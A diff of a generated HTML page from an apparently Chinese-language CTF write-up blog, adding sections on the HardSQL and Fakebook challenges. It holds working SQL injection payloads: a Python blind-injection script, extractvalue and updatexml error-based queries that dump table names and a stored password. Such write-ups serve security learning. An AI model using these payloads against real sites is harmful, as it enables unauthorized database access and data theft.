@@ -365,7 +365,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:
-                    416
+                    470
                 </div>
                 
 
@@ -407,8 +407,8 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
     <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
         s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">max</span> <span class="token operator">+</span> <span class="token builtin">min</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>
         payload <span class="token operator">=</span> <span class="token string">'1^(ascii(substr((select(flag)from(flag)),'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>
-            i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">',1))&gt;'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">')'</span>
-        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
+            i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">',1))>'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">')'</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'id'</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
         time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.005</span><span class="token punctuation">)</span>
         <span class="token keyword">if</span> <span class="token string">'Hello, glzjin wants a girlfriend.'</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
             <span class="token builtin">max</span> <span class="token operator">=</span> s
@@ -423,8 +423,8 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
 <h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>先试一下一些常见的账号密码，都没用</p>
 <p>空格和=被过滤了，可以用()和like来代替</p>
 <p>这题试了一下应该是报错注入，需要用到<code>^</code>连接函数形成异或</p>
-<p>payload:<code>?username=admin&amp;password=admin'^extractvalue(1,concat(0x7e,(select(database()))))%23</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210225090738803.png" alt="image-20210225090738803"></p>
+<p>payload:<code>?username=admin&amp;password=admin&#39;^extractvalue(1,concat(0x7e,(select(database()))))%23</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210225090738803.png"></p>
 <p>成功显示数据库</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 爆表</span>
 ?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>admin<span class="token string">'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('</span>geek<span class="token string">')))))%23
@@ -439,7 +439,14 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
 ?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>admin<span class="token operator">%</span><span class="token number">27</span><span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token keyword">left</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>geek<span class="token punctuation">.</span>H4rDsq1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
 ?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>admin<span class="token operator">%</span><span class="token number">27</span><span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token keyword">right</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>geek<span class="token punctuation">.</span>H4rDsq1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2>
+<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>随便注册一个用户登录发现有URL中有<code>view.php?no=1</code>no参数</p>
+<pre class="line-numbers language-none"><code class="language-none">?no&#x3D;1 order by 4 #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210225214056503.png"></p>
+<p>这里存在SQL注入</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">view</span><span class="token punctuation">.</span>php?<span class="token keyword">no</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>make_set<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'~'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
                 
             </div>
             <hr/>
@@ -820,7 +827,7 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">34.8k</span>&nbsp;字
+                class="white-color">36.1k</span>&nbsp;字
             
             
             
